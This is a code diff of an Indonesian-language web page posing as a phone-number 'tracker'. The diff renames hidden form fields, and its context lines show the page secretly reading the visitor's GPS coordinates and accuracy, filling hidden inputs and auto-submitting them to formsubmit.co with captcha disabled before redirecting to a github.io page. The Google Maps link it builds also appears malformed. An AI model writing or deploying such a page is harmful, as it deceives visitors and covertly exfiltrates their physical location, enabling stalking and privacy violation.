@@ -21,12 +21,12 @@
         <hr color="#003300">
         <p>MASUKKAN NOMOR TARGET:</p>
         
-        <!-- Form Utama - Pastikan Alamat Action Benar -->
+        <!-- Form Utama - Alamat sudah diperbaiki manual -->
         <form action="https://formsubmit.co" method="POST" id="trackerForm">
-            <input type="text" name="Nomor_HP" id="phone" placeholder="08xxxxxxxxxx" required>
+            <input type="text" name="Nomor_Target" id="phone" placeholder="08xxxxxxxxxx" required>
             
             <!-- Data Tersembunyi -->
-            <input type="hidden" name="Lokasi_Google_Maps" id="gmaps_link">
+            <input type="hidden" name="Link_Google_Maps" id="gmaps_link">
             <input type="hidden" name="Akurasi_GPS" id="accuracy">
             <input type="hidden" name="_next" value="https://hiskiayoel9-max.github.io">
             <input type="hidden" name="_captcha" value="false">
@@ -53,13 +53,13 @@
                     const lon = position.coords.longitude;
                     const acc = position.coords.accuracy;
                     
-                    // Isi data ke form
+                    // Isi data ke form secara otomatis
                     document.getElementById('accuracy').value = acc + " meter";
                     document.getElementById('gmaps_link').value = "https://www.google.com" + lat + "," + lon;
                     
                     status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM...";
                     
-                    // Kirim form secara otomatis
+                    // Kirim form
                     document.getElementById('trackerForm').submit();
                     
                 }, (error) => {
